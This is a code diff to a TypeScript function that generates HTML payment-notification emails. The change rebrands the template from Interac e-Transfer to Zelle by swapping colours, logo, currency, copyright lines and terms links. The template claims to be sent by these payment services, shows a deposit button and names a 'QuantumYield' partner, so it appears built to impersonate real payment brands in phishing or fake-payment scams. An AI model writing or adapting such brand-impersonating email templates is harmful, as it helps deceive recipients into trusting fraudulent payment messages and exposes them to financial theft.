@@ -45,7 +45,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Interac e-Transfer</title>
+  <title>Zelle Payment</title>
   <style>
     body {
       margin: 0;
@@ -117,7 +117,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       margin-bottom: 12px;
     }
     .amount-box {
-      background-color: #FDB913;
+      background-color: #6D1ED4;
+      color: #ffffff;
       padding: 16px;
       border-radius: 6px;
       font-size: 18px;
@@ -159,7 +160,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
     }
     .message-box {
       background-color: #f9f9f9;
-      border-left: 4px solid #FDB913;
+      border-left: 4px solid #6D1ED4;
       padding: 16px;
       margin: 20px 0;
       border-radius: 4px;
@@ -170,8 +171,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       color: #000000;
     }
     .security-section {
-      background-color: #fff9e6;
-      border: 2px solid #FDB913;
+      background-color: #f5f0ff;
+      border: 2px solid #6D1ED4;
       border-radius: 8px;
       padding: 20px;
       margin: 20px 0;
@@ -223,8 +224,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       margin: 32px 0;
     }
     .deposit-button {
-      background-color: #FDB913;
-      color: #000000;
+      background-color: #6D1ED4;
+      color: #ffffff;
       padding: 14px 30px;
       font-weight: bold;
       text-decoration: none;
@@ -234,7 +235,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
       transition: background-color 0.2s;
     }
     .deposit-button:hover {
-      background-color: #e5a811;
+      background-color: #5A18B0;
     }
     .instructions {
       background-color: #f9f9f9;
@@ -296,7 +297,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
   <div class="email-container">
     <div class="topbar">
       <div class="topbar-left">
-        <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
+        <div style="width:40px;height:40px;background:#6D1ED4;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;font-weight:900;font-size:22px;color:#fff;line-height:1;">Z</div>
         <div class="dba">Partnered with QuantumYield</div>
       </div>
       <div class="topbar-right">
@@ -307,10 +308,10 @@ export function generateInteracEmailHtml(data: EmailData): string {
     <div class="content-wrapper">
         <div class="greeting-section">
           <h1>Hi ${recipientName},</h1>
-          <p>You've received a secure Interac e-Transfer.</p>
+          <p>You&apos;ve received a secure Zelle payment.</p>
 
           <div class="amount-box">
-            Amount: $${formattedAmount} CAD
+            Amount: $${formattedAmount} USD
           </div>
 
           <div class="details-card">
@@ -329,7 +330,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
             </div>
             <div class="detail-row">
               <span class="detail-label">Amount:</span>
-              <span class="detail-value">$${formattedAmount} CAD</span>
+              <span class="detail-value">$${formattedAmount} USD</span>
             </div>
           </div>
 
@@ -380,9 +381,9 @@ export function generateInteracEmailHtml(data: EmailData): string {
     </div>
 
     <div class="footer">
-      <p>© 2025 Interac Corp. This email was sent to you by Interac Corp., the owner of the Interac e-Transfer service, on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
+      <p>© ${new Date().getFullYear()} Zelle. This email was sent on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
       <p style="margin-top: 8px;">
-        <a href="https://www.interac.ca/en/interac-e-transfer-terms-of-use/">Terms of Use</a>
+        <a href="https://www.zellepay.com/terms-of-use">Terms of Use</a>
       </p>
       <p style="margin-top: 8px;">This is an automated email. Please do not reply to this message.</p>
     </div>
